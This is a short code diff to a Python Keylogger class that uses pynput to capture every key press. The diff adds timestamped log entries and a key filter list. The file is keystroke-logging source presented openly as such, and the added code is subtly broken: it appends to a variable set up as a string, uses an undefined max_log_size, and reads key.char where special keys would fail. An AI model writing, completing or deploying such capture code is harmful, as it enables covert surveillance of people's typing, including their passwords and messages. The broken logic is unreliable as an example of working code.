@@ -1,6 +1,7 @@
 from pynput import keyboard
 import threading
 from typing import Optional
+from datetime import datetime
 
 
 class Keylogger:
@@ -10,6 +11,7 @@ class Keylogger:
         self.is_listening = False
         self.log = ""
         self._stop_event = threading.Event()
+        self.filter_keys = []
 
     def _on_press(self, key) -> None:
         try:
@@ -19,6 +21,18 @@ class Keylogger:
                 self.log += " "
             else:
                 self.log += f"[{key.name}]"
+
+        if key.char in self.filter_keys:
+            return
+
+        log_entry = {
+            "timestamp": datetime.now().isoformat(),
+            "key": key.char,
+        }
+        self.log.append(log_entry)
+
+        if len(self.log) >= self.max_log_size:
+            pass
 
     def _start_listener(self) -> None:
         with keyboard.Listener(on_press=self._on_press) as listener:
